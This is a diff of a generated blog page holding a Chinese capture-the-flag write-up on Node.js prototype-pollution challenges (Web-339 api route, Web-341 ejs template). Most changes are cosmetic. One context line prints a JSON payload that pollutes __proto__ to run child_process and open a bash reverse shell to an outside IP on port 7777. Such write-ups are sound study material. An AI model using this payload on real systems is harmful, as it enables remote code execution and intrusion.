@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -327,7 +327,7 @@
 <p>body-parser是非常常用的一个express中间件，作用是对post请求的请求体进行解析  。</p>
 <p>除此之外为什么要用json格式传输，p神博客中也提及了，如果不用json文件发送那么<code>__proto__</code>就会被当作原型执行，导致污染失败，只有通过json格式提交，才会被当作key来执行，这样才能达到原型链污染的效果。</p>
 <p>关于nodejs请求 可以参考这篇文章比较符合我这种新手：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Diamond-sjh/p/11324138.html">https://www.cnblogs.com/Diamond-sjh/p/11324138.html</a></p>
-<h1 id="Web-339-api"><a href="#Web-339-api" class="headerlink" title="Web-339 (api)"></a>Web-339 (api)</h1><p>这道题目多了一个/api路由 并且看到了render 多了一个模板渲染</p>
+<h1 id="Web-339-api"><a href="#Web-339-api" class="headerlink" title="Web-339 (api)"></a>Web-339 (api)</h1><p>这道题目多了一个&#x2F;api路由 并且看到了render 多了一个模板渲染</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png" alt="img"></p>
 <p>发现Function 这里借用p神的理解</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png" alt="img"></p>
@@ -350,9 +350,9 @@
 <p>这里user为一个对象 他的属性userinfo也是一个对象 </p>
 <p>那么如果我们想通过copy函数通过<code>user.userinfo</code>污染到<code>Object.prototype</code></p>
 <p>即则<code>user.userinfo-&gt;user(第一次污染)-&gt;Object(第二次污染)</code>需要污染两次</p>
-<p>路由/api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可</p>
+<p>路由&#x2F;api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可</p>
 <p> <code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p>
-<h1 id="Web-341-ejs模板"><a href="#Web-341-ejs模板" class="headerlink" title="Web-341(ejs模板)"></a>Web-341(ejs模板)</h1><p>没了/api路由</p>
+<h1 id="Web-341-ejs模板"><a href="#Web-341-ejs模板" class="headerlink" title="Web-341(ejs模板)"></a>Web-341(ejs模板)</h1><p>没了&#x2F;api路由</p>
 <p>也没有了条件输出flag</p>
 <p>看了wp是ejs的模板引擎的原型链污染rce</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png" alt="img"></p>
